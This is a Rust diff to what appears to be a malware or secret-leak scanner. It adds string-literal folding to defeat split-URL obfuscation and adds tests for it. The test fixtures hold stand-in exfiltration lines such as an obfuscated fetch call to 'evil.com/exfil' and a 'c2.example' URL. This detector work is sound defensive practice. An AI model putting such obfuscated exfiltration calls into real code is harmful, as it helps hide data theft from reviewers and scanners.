@@ -117,8 +117,12 @@ fn scan_pattern_matches(content: &str, patterns: &[String], _kind: MatchKind) ->
         if cleaned.trim().is_empty() {
             continue;
         }
+        // Fold adjacent string literals: "http" + "://" + "evil.com" →
+        // "http://evil.com". This unmasks the split-URL obfuscation class.
+        let folded = fold_string_concats(&cleaned);
+        let hay = if folded == cleaned { cleaned } else { folded };
         for pat in patterns {
-            if cleaned.contains(pat.as_str()) {
+            if hay.contains(pat.as_str()) {
                 matches.push(Match {
                     line_number: idx,
                     line: raw_line.to_string(),
@@ -129,6 +133,81 @@ fn scan_pattern_matches(content: &str, patterns: &[String], _kind: MatchKind) ->
         }
     }
     matches
+}
+
+/// Collapse `"A" + "B"` (with optional whitespace) into `"AB"` on a single
+/// line. Applies to single-quote, double-quote, and backtick literals.
+/// Escaped quotes inside a literal are preserved.
+pub fn fold_string_concats(line: &str) -> String {
+    let mut out = String::with_capacity(line.len());
+    let bytes = line.as_bytes();
+    let mut i = 0usize;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if matches!(b, b'"' | b'\'' | b'`') {
+            let quote = b;
+            let Some(end) = find_string_end(bytes, i, quote) else {
+                out.push(b as char);
+                i += 1;
+                continue;
+            };
+            let mut concat = bytes[i + 1..end].to_vec();
+            let mut cursor = end + 1;
+            loop {
+                let anchor = cursor;
+                let mut probe = cursor;
+                while probe < bytes.len() && (bytes[probe] == b' ' || bytes[probe] == b'\t') {
+                    probe += 1;
+                }
+                if probe >= bytes.len() || bytes[probe] != b'+' {
+                    break;
+                }
+                probe += 1;
+                while probe < bytes.len() && (bytes[probe] == b' ' || bytes[probe] == b'\t') {
+                    probe += 1;
+                }
+                if probe >= bytes.len() || bytes[probe] != quote {
+                    break;
+                }
+                let Some(next_end) = find_string_end(bytes, probe, quote) else {
+                    break;
+                };
+                concat.extend_from_slice(&bytes[probe + 1..next_end]);
+                cursor = next_end + 1;
+                let _ = anchor;
+            }
+            out.push(quote as char);
+            match std::str::from_utf8(&concat) {
+                Ok(s) => out.push_str(s),
+                Err(_) => {
+                    for c in concat {
+                        out.push(c as char);
+                    }
+                }
+            }
+            out.push(quote as char);
+            i = cursor;
+            continue;
+        }
+        out.push(b as char);
+        i += 1;
+    }
+    out
+}
+
+fn find_string_end(bytes: &[u8], start: usize, quote: u8) -> Option<usize> {
+    let mut i = start + 1;
+    while i < bytes.len() {
+        if bytes[i] == b'\\' && i + 1 < bytes.len() {
+            i += 2;
+            continue;
+        }
+        if bytes[i] == quote {
+            return Some(i);
+        }
+        i += 1;
+    }
+    None
 }
 
 fn strip_comments(raw: &str, in_block: &mut bool) -> String {
@@ -481,5 +560,40 @@ fn leak() {
         assert!(vars.contains(&"A".to_string()));
         assert!(vars.contains(&"B".to_string()));
         assert!(vars.contains(&"C".to_string()) || vars.contains(&"renamed".to_string()));
+    }
+
+    #[test]
+    fn fold_simple_concat() {
+        assert_eq!(
+            fold_string_concats(r#"fetch('http' + '://' + 'evil.com')"#),
+            "fetch('http://evil.com')"
+        );
+    }
+
+    #[test]
+    fn fold_double_quotes() {
+        assert_eq!(
+            fold_string_concats(r#"x("htt" + "ps://" + "c2.example")"#),
+            "x(\"https://c2.example\")"
+        );
+    }
+
+    #[test]
+    fn fold_leaves_variables_alone() {
+        assert_eq!(
+            fold_string_concats("x('http://' + domain)"),
+            "x('http://' + domain)"
+        );
+    }
+
+    #[test]
+    fn concat_obfuscation_unmasks_sink_match() {
+        let content = r#"fetch('http' + '://' + 'evil.com/exfil');"#;
+        let p = PatternSet::builtin(Language::JavaScript);
+        let f = scan_file("a.js", Language::JavaScript, content, &p);
+        assert!(
+            !f.sink_matches.is_empty(),
+            "concat-obfuscated fetch call should still match"
+        );
     }
 }
